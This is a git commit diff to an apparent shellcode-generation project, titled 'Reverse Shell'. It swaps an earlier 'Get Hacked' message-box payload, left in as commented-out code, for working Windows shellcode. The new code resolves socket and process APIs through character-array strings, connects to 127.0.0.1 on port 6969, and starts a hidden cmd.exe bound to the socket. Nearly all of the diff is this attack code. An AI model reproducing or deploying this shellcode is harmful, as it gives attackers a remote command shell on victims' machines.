98fdf49a93283b7f8ce3d809abcddbc763deaf5c
uttervitriol <uttervitriol@gmail.com>
2023-12-04 23:05:11 -0500

    Reverse Shell

--- GenShellcode/code.cpp
+++ GenShellcode/code.cpp
@@ -1,5 +1,8 @@
 // https://dennisbabkin.com/blog/?t=how-to-implement-getprocaddress-in-shellcode
 // https://www.codeproject.com/Articles/5304605/Creating-Shellcode-from-any-Code-Using-Visual-Stud
+
+#define WIN_32_LEAN_AND_MEAN
+#include <WinSock2.h>
 #include <Windows.h>
 
 #if _WIN64
@@ -105,21 +108,84 @@ extern "C" uintptr_t _code()
 	typedef uintptr_t(WINAPI* funcLLA)(char*);
 	funcLLA LoadLibraryA = (funcLLA)pLoadLibraryA;
 
+	char strWs2[] = { 'W', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', '\x00' };
+	uintptr_t Ws2_32 = LoadLibraryA(strWs2);
 
-	char strUser32[] = { 'U', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', '\x00' };
+	char strSocket[] = { 'W', 'S', 'A', 'S', 'o', 'c', 'k', 'e', 't', 'A', '\x00' };
+	typedef SOCKET(WSAAPI* funcWSASocketA)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
+	funcWSASocketA _WSASocketA = (funcWSASocketA)GetProcAddress(Ws2_32, strSocket);
 
-	uintptr_t User32 = LoadLibraryA(strUser32);
+	char strInetAddr[] = {'i', 'n', 'e', 't', '_', 'a', 'd', 'd', 'r', '\x00'};
+	typedef unsigned long (*funcInet_addr)(const char*);
+	funcInet_addr _inet_addr = (funcInet_addr)GetProcAddress(Ws2_32, strInetAddr);
 
-	char strMessageBox[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', '\x00' };
+	char strConnect[] = { 'c', 'o', 'n', 'n', 'e', 'c', 't', '\x00' };
+	typedef int(WSAAPI* funcConnect)(SOCKET, const sockaddr*, int);
+	funcConnect _connect = (funcConnect)GetProcAddress(Ws2_32, strConnect);
 
-	uintptr_t pMessageBox = (uintptr_t)GetProcAddress(User32, strMessageBox);
+	char strCreateProcess[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\00' };
+	typedef BOOL(*funcCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+	funcCreateProcessA _CreateProcessA = (funcCreateProcessA)GetProcAddress(Kernel32, strCreateProcess);
 
-	char strMsg[] = { 'G', 'e', 't', ' ', 'H', 'a', 'c', 'k', 'e', 'd', '\x00' };
+	char strExitThread[] = { 'E', 'x', 'i', 't', 'T', 'h', 'r', 'e', 'a', 'd', '\x00' };
+	typedef void(*funcExitThread)(DWORD);
+	funcExitThread _ExitThread = (funcExitThread)GetProcAddress(Kernel32, strExitThread);
 
-	typedef int (WINAPI* funcMBA)(HWND, LPCSTR, LPCSTR, UINT);
-	funcMBA MessageBoxA = (funcMBA)pMessageBox;
-	MessageBoxA(0, strMsg, 0, 0);
+	struct sockaddr_in hints = { 0 };
+	SOCKET sock = _WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+	hints.sin_family = AF_INET;
+	//hints.sin_port = 6969;
+	hints.sin_port = 0x391b;
+	char strIp[] = { '1', '2', '7', '.', '0', '.', '0', '.', '1', '\x00' };
+	hints.sin_addr.s_addr = _inet_addr(strIp);
 
+	_connect(sock, (struct sockaddr*)&hints, sizeof(hints));
+
+	STARTUPINFOA sinfo = { 0 };
+	sinfo.cb = sizeof(sinfo);
+	sinfo.dwFlags = (STARTF_USESTDHANDLES);
+	sinfo.hStdInput = (HANDLE)sock;
+	sinfo.hStdOutput = (HANDLE)sock;
+	sinfo.hStdError = (HANDLE)sock;
+	PROCESS_INFORMATION pinfo;
+	char strCmd[] = { 'c', 'm', 'd', '\x00' };
+	_CreateProcessA(NULL, strCmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+		
+	_ExitThread(0);
 	return pLoadLibraryA;
 }
+
+//extern "C" uintptr_t _code()
+//{
+//
+//	uintptr_t Kernel32 = GetKernel32Base();
+//	uintptr_t pGetProcAddress = GetAddrGetProcAddress(Kernel32);
+//
+//	typedef FARPROC(WINAPI* funcGPA)(uintptr_t, char*);
+//	funcGPA GetProcAddress = (funcGPA)pGetProcAddress;
+//
+//	const char strLoadLibrary[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\x00' };
+//
+//	uintptr_t pLoadLibraryA = (uintptr_t)GetProcAddress(Kernel32, (char*)strLoadLibrary);
+//
+//	typedef uintptr_t(WINAPI* funcLLA)(char*);
+//	funcLLA LoadLibraryA = (funcLLA)pLoadLibraryA;
+//
+//
+//	char strUser32[] = { 'U', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', '\x00' };
+//
+//	uintptr_t User32 = LoadLibraryA(strUser32);
+//
+//	char strMessageBox[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', '\x00' };
+//
+//	uintptr_t pMessageBox = (uintptr_t)GetProcAddress(User32, strMessageBox);
+//
+//	char strMsg[] = { 'G', 'e', 't', ' ', 'H', 'a', 'c', 'k', 'e', 'd', '\x00' };
+//
+//	typedef int (WINAPI* funcMBA)(HWND, LPCSTR, LPCSTR, UINT);
+//	funcMBA MessageBoxA = (funcMBA)pMessageBox;
+//	MessageBoxA(0, strMsg, 0, 0);
+//
+//	return pLoadLibraryA;
+//}
 
